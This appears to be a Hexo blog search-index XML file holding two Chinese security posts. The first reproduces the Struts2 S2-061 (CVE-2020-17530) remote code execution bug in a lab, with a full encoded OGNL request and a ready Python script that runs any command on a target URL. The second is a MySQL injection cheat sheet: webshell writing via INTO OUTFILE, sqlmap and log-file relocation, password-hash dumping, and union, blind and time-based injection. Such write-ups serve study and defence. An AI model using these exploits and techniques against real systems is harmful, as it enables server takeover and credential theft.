<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>S2-061 CVE-2020-17530 复现过程</title>
    <url>/posts/4a2d04ee.html</url>
    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>S2-061是对S2-059的绕过，Struts2官方对S2-059的修复方式是加强OGNL表达式沙盒，而S2-061绕过了该沙盒。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.0.0到Struts 2.5.25</p>
<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><p>使用<code>vulhub</code>搭建漏洞环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020121401.png" alt="image.png"><br>启动完成后打开<code>http://ip:8080/</code>页面如下：<br><img src="https://qiniu.hzktester.top/tp2020121402.png" alt="image.png"><br>使用以下<code>poc</code>访问：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.action?id=%25%7b%28%23instancemanager%3d%23application%5b%22org.apache.tomcat.InstanceManager%22%5d%29.%28%23stack%3d%23attr%5b%22com.opensymphony.xwork2.util.ValueStack.ValueStack%22%5d%29.%28%23bean%3d%23instancemanager.newInstance%28%22org.apache.commons.collections.BeanMap%22%29%29.%28%23bean.setBean%28%23stack%29%29.%28%23context%3d%23bean.get%28%22context%22%29%29.%28%23bean.setBean%28%23context%29%29.%28%23macc%3d%23bean.get%28%22memberAccess%22%29%29.%28%23bean.setBean%28%23macc%29%29.%28%23emptyset%3d%23instancemanager.newInstance%28%22java.util.HashSet%22%29%29.%28%23bean.put%28%22excludedClasses%22%2c%23emptyset%29%29.%28%23bean.put%28%22excludedPackageNames%22%2c%23emptyset%29%29.%28%23arglist%3d%23instancemanager.newInstance%28%22java.util.ArrayList%22%29%29.%28%23arglist.add%28%22id%22%29%29.%28%23execute%3d%23instancemanager.newInstance%28%22freemarker.template.utility.Execute%22%29%29.%28%23execute.exec%28%23arglist%29%29%7d</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: ip:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020121403.png" alt="image.png"></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> <span class="comment">#author:Jaky</span></span><br><span class="line"> <span class="comment">#微信公众号:洛米唯熊</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests,sys,re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)&lt;<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;[+]Use: pyhton3 s2-061.py http://ip:port command&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[+]Explain: 洛米唯熊&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[+]============================================================&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Jaky</span>():</span></span><br><span class="line">    payload=<span class="string">&quot;%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27&quot;</span>+sys.argv[<span class="number">2</span>]+<span class="string">&quot;%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d&quot;</span>  </span><br><span class="line">    url=sys.argv[<span class="number">1</span>]+<span class="string">&quot;/index.action?id=&quot;</span>+payload</span><br><span class="line">    r=requests.get(url).text</span><br><span class="line">    z=re.findall(<span class="string">&quot;a id=.*&quot;</span>,r)</span><br><span class="line">    <span class="keyword">print</span> (str(z).replace(<span class="string">&quot;a id=\&quot;&quot;</span>,<span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    Jaky()</span><br></pre></td></tr></table></figure>
<p>ps：来自公众号：<a href="https://mp.weixin.qq.com/s?__biz=MzIzODE0NDc3OQ==&mid=2247484154&idx=1&sn=7fcc57ee38869197f48d4f3ceeaccd63&chksm=e93c9e9ede4b17885f07f86f599c4c461413557ebfa44fee4ab62cad2ef9b03a05bd7a48fb65&mpshare=1&scene=23&srcid=1214BWjeHNQst0i7Q9RFfAbN&sharer_sharetime=1607931358657&sharer_shareid=055dce8b8f91f349b2f316f3124eb0a4#rd">洛米唯熊</a><br>效果图：<br><img src="https://qiniu.hzktester.top/tp2020121404.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL注入总结</title>
    <url>/posts/4d57c853.html</url>
    <content><![CDATA[<h1 id="写shell命令总结"><a href="#写shell命令总结" class="headerlink" title="写shell命令总结"></a>写shell命令总结</h1><h2 id="sql语句写入shell："><a href="#sql语句写入shell：" class="headerlink" title="sql语句写入shell："></a>sql语句写入shell：</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="sqlmap写入shell："><a href="#sqlmap写入shell：" class="headerlink" title="sqlmap写入shell："></a>sqlmap写入shell：</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://x.x.x.x/?id=x&quot; <span class="comment">--file-write=&quot;/Users/guang/Desktop/shell.php&quot; --file-dest=&quot;/var/www/html/test/shell.php&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="日志文件写入shell："><a href="#日志文件写入shell：" class="headerlink" title="日志文件写入shell："></a>日志文件写入shell：</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 更改日志文件位置</span></span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log = <span class="string">&quot;ON&quot;</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file=<span class="string">&#x27;/var/www/html/info.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看当前配置</span></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;general%&#x27;;</span><br><span class="line">+<span class="comment">------------------+-----------------------------+</span></span><br><span class="line">| Variable_name    | Value                       |</span><br><span class="line">+<span class="comment">------------------+-----------------------------+</span></span><br><span class="line">| general_log      | ON                          |</span><br><span class="line">| general_log_file | /var/www/html/info.php |</span><br><span class="line">+<span class="comment">------------------+-----------------------------+</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 往日志里面写入 payload</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h1 id="hash密码获取"><a href="#hash密码获取" class="headerlink" title="hash密码获取"></a>hash密码获取</h1><h2 id="MySQL-lt-5-6-版本"><a href="#MySQL-lt-5-6-版本" class="headerlink" title="MySQL &lt;= 5.6 版本"></a><em>MySQL &lt;= 5.6 版本</em></h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select host, user, password from mysql.user;</span><br><span class="line">+<span class="comment">-----------+------+-------------------------------------------+</span></span><br><span class="line">| host      | user | password                                  |</span><br><span class="line">+<span class="comment">-----------+------+-------------------------------------------+</span></span><br><span class="line">| localhost | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| 127.0.0.1 | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| ::1       | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">| %         | root | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+<span class="comment">-----------+------+-------------------------------------------+</span></span><br></pre></td></tr></table></figure>
<h2 id="MySQL-gt-5-7-版本"><a href="#MySQL-gt-5-7-版本" class="headerlink" title="MySQL &gt;= 5.7 版本"></a><em>MySQL &gt;= 5.7 版本</em></h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql &gt; select host,user,authentication_string from mysql.user;</span><br><span class="line">+<span class="comment">-----------+---------------+-------------------------------------------+</span></span><br><span class="line">| host      | user          | authentication_string                     |</span><br><span class="line">+<span class="comment">-----------+---------------+-------------------------------------------+</span></span><br><span class="line">| localhost | root          | *8232A1298A49F710DBEE0B330C42EEC825D4190A |</span><br><span class="line">| localhost | mysql.session | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">| localhost | mysql.sys     | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |</span><br><span class="line">+<span class="comment">-----------+---------------+-------------------------------------------+</span></span><br></pre></td></tr></table></figure>
<h1 id="mysql常用技巧"><a href="#mysql常用技巧" class="headerlink" title="mysql常用技巧"></a>mysql常用技巧</h1><h2 id="order-by：用于判断字段数量"><a href="#order-by：用于判断字段数量" class="headerlink" title="order by：用于判断字段数量"></a>order by：用于判断字段数量</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select id,username from user order by 1;</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">| id | username  |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">|  1 | testdemo  |</span><br><span class="line">|  2 | testdemo2 |</span><br><span class="line">|  3 | testdemo3 |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">id</span>,username <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;3&#x27; in &#x27;order clause&#x27;</span><br></pre></td></tr></table></figure>
<h2 id="limit：用户限制查询结果行数"><a href="#limit：用户限制查询结果行数" class="headerlink" title="limit：用户限制查询结果行数"></a>limit：用户限制查询结果行数</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select id,username from user limit 0,1;</span><br><span class="line">+<span class="comment">----+----------+</span></span><br><span class="line">| id | username |</span><br><span class="line">+<span class="comment">----+----------+</span></span><br><span class="line">|  1 | testdemo |</span><br><span class="line">+<span class="comment">----+----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>不使用逗号的<code>limit</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select id,username from user limit 1 offset 0;</span><br><span class="line">+<span class="comment">----+----------+</span></span><br><span class="line">| id | username |</span><br><span class="line">+<span class="comment">----+----------+</span></span><br><span class="line">|  1 | testdemo |</span><br><span class="line">+<span class="comment">----+----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h2 id="mysql中的注释"><a href="#mysql中的注释" class="headerlink" title="mysql中的注释"></a>mysql中的注释</h2><h3 id="：单行注释"><a href="#：单行注释" class="headerlink" title="#：单行注释"></a>#：单行注释</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select id,username from user;#select user();</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">| id | username  |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">|  1 | testdemo  |</span><br><span class="line">|  2 | testdemo2 |</span><br><span class="line">|  3 | testdemo3 |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="：-单行注释"><a href="#：-单行注释" class="headerlink" title="/**/： 单行注释"></a>/**/： 单行注释</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select id,username from user;/*select user()*/;</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">| id | username  |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">|  1 | testdemo  |</span><br><span class="line">|  2 | testdemo2 |</span><br><span class="line">|  3 | testdemo3 |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="–-空格-：单行注释"><a href="#–-空格-：单行注释" class="headerlink" title="–+(空格)：单行注释"></a>–+(空格)：单行注释</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select id,username from user;-- select user();</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">| id | username  |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">|  1 | testdemo  |</span><br><span class="line">|  2 | testdemo2 |</span><br><span class="line">|  3 | testdemo3 |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="：内敛注释"><a href="#：内敛注释" class="headerlink" title="/!/：内敛注释"></a>/<em>!</em>/：内敛注释</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; /*!select*/ id,username from user;</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">| id | username  |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">|  1 | testdemo  |</span><br><span class="line">|  2 | testdemo2 |</span><br><span class="line">|  3 | testdemo3 |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<p>/<em>!12345</em>/：内敛注释</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; /*!12345select*/ id,username from user;</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">| id | username  |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">|  1 | testdemo  |</span><br><span class="line">|  2 | testdemo2 |</span><br><span class="line">|  3 | testdemo3 |</span><br><span class="line">+<span class="comment">----+-----------+</span></span><br><span class="line">3 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h2 id="mysql中的比较语句：都支持16进制"><a href="#mysql中的比较语句：都支持16进制" class="headerlink" title="mysql中的比较语句：都支持16进制"></a>mysql中的比较语句：都支持16进制</h2><h3 id="in："><a href="#in：" class="headerlink" title="in："></a>in：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 1 in (1);</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| 1 in (1) |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">|        1 |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="like："><a href="#like：" class="headerlink" title="like："></a>like：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 1234 like &#x27;%23%&#x27;; # 模糊匹配</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">| 1234 like &#x27;%23%&#x27; |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">|                1 |</span><br><span class="line">+<span class="comment">------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="regexp："><a href="#regexp：" class="headerlink" title="regexp："></a>regexp：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#x27;123456&#x27; regexp &#x27;[0-9]+&#x27;; # 正则匹配</span><br><span class="line">+<span class="comment">--------------------------+</span></span><br><span class="line">| &#x27;123456&#x27; regexp &#x27;[0-9]+&#x27; |</span><br><span class="line">+<span class="comment">--------------------------+</span></span><br><span class="line">|                        1 |</span><br><span class="line">+<span class="comment">--------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="rlike："><a href="#rlike：" class="headerlink" title="rlike："></a>rlike：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#x27;123456&#x27; rlike &#x27;[0-9]+&#x27;; # 正则匹配</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br><span class="line">| &#x27;123456&#x27; rlike &#x27;[0-9]+&#x27; |</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br><span class="line">|                       1 |</span><br><span class="line">+<span class="comment">-------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h2 id="mysql查询语句："><a href="#mysql查询语句：" class="headerlink" title="mysql查询语句："></a>mysql查询语句：</h2><h3 id="查询数据库名："><a href="#查询数据库名：" class="headerlink" title="查询数据库名："></a>查询数据库名：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select schema_name from information_schema.schemata;</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| schema_name        |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| information_schema |</span><br><span class="line">| empirecms          |</span><br><span class="line">| met                |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| test               |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">6 rows in <span class="keyword">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="查询库中的表名："><a href="#查询库中的表名：" class="headerlink" title="查询库中的表名："></a>查询库中的表名：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema=&#x27;test&#x27;;</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| table_name |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">| user       |</span><br><span class="line">+<span class="comment">------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="查询表中的字段名："><a href="#查询表中的字段名：" class="headerlink" title="查询表中的字段名："></a>查询表中的字段名：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name=&#x27;user&#x27;;</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">| column_name            |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">| Host                   |</span><br><span class="line">| User                   |</span><br><span class="line">| Password               |</span><br><span class="line">| Select_priv            |</span><br><span class="line">| Insert_priv            |</span><br><span class="line">| ...........            |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">45 rows in <span class="keyword">set</span> (<span class="number">0.02</span> sec)</span><br></pre></td></tr></table></figure>


<h2 id="mysql中的条件语句"><a href="#mysql中的条件语句" class="headerlink" title="mysql中的条件语句"></a>mysql中的条件语句</h2><h3 id="IF-expr1-expr2-expr3-："><a href="#IF-expr1-expr2-expr3-：" class="headerlink" title="IF(expr1,expr2,expr3)："></a>IF(expr1,expr2,expr3)：</h3><p>如果<code>expr1</code>是<code>TRUE</code>则返回值为<code>expr2</code>,否则返回值则为<code>expr3</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select if(1=1,&#x27;yes&#x27;,&#x27;no&#x27;);</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| if(1=1,&#x27;yes&#x27;,&#x27;no&#x27;) |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| yes                |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">1</span>=<span class="number">2</span>,<span class="string">&#x27;yes&#x27;</span>,<span class="string">&#x27;no&#x27;</span>);</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| if(1=2,&#x27;yes&#x27;,&#x27;no&#x27;) |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">| no                 |</span><br><span class="line">+<span class="comment">--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="IFNULL-expr1-expr2-："><a href="#IFNULL-expr1-expr2-：" class="headerlink" title="IFNULL(expr1,expr2)："></a>IFNULL(expr1,expr2)：</h3><p>如果<code>expr1</code>不为<code>NULL</code>，则返回值为<code>expr1</code>,否则其返回值为<code>expr2</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select ifnull(1,&#x27;testdemo&#x27;);</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| ifnull(1,&#x27;testdemo&#x27;) |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">| 1                    |</span><br><span class="line">+<span class="comment">----------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">ifnull</span>(<span class="number">1</span>/<span class="number">0</span>,<span class="string">&#x27;testdemo&#x27;</span>);</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">| ifnull(1/0,&#x27;testdemo&#x27;) |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">| testdemo               |</span><br><span class="line">+<span class="comment">------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="case-when-expr1-then-expr2-else-expr3-end："><a href="#case-when-expr1-then-expr2-else-expr3-end：" class="headerlink" title="case when expr1 then expr2 else expr3 end："></a>case when expr1 then expr2 else expr3 end：</h3><p>如果<code>expr1</code>是<code>TRUE</code>则返回值为<code>expr2</code>,否则返回值则为<code>expr3</code></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select case when ascii(substr(database(),1,1))&gt;1 then 1 else 2 end;</span><br><span class="line">+<span class="comment">-------------------------------------------------------------+</span></span><br><span class="line">| case when ascii(substr(database(),1,1))&gt;1 then 1 else 2 end |</span><br><span class="line">+<span class="comment">-------------------------------------------------------------+</span></span><br><span class="line">|                                                           1 |</span><br><span class="line">+<span class="comment">-------------------------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">128</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">2</span> <span class="keyword">end</span>;</span><br><span class="line">+<span class="comment">---------------------------------------------------------------+</span></span><br><span class="line">| case when ascii(substr(database(),1,1))&gt;128 then 1 else 2 end |</span><br><span class="line">+<span class="comment">---------------------------------------------------------------+</span></span><br><span class="line">|                                                             2 |</span><br><span class="line">+<span class="comment">---------------------------------------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h2 id="mysql中的联合注入union"><a href="#mysql中的联合注入union" class="headerlink" title="mysql中的联合注入union"></a>mysql中的联合注入union</h2><h3 id="union-select："><a href="#union-select：" class="headerlink" title="union select："></a>union select：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user union select 1,2,3;</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">| id | username  | password                         |</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">|  1 | testdemo  | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">|  2 | testdemo2 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">|  3 | testdemo3 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">|  1 | 2         | 3                                |</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h3 id="union-all-select："><a href="#union-all-select：" class="headerlink" title="union all select："></a>union all select：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from user union all select 1,2,3;</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">| id | username  | password                         |</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">|  1 | testdemo  | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">|  2 | testdemo2 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">|  3 | testdemo3 | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">|  1 | 2         | 3                                |</span><br><span class="line">+<span class="comment">----+-----------+----------------------------------+</span></span><br><span class="line">4 rows in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>通过返回结果来判断字符<code>ascii</code>码，最终能获取<code>database()</code>的结果</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username,password from user where id=1 and ascii(substr((select database()),1,1))&gt;65;</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">| username | password                         |</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">| testdemo | e10adc3949ba59abbe56e057f20f883e |</span><br><span class="line">+<span class="comment">----------+----------------------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> username,<span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">128</span>;</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure>
<h2 id="延迟注入"><a href="#延迟注入" class="headerlink" title="延迟注入"></a>延迟注入</h2><p>通过返回的结果的时间来判断字符<code>ascii</code>码，最终能获取<code>database()</code>的结果</p>
<h3 id="IF-："><a href="#IF-：" class="headerlink" title="IF()："></a>IF()：</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql&gt; select username from user where id=1 and if(ascii(substr((select database()),1,1))&gt;1,1,sleep(1));</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| username |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">| testdemo |</span><br><span class="line">+<span class="comment">----------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">128</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">1</span>));</span><br><span class="line">Empty <span class="keyword">set</span> (<span class="number">1.00</span> sec)</span><br></pre></td></tr></table></figure>
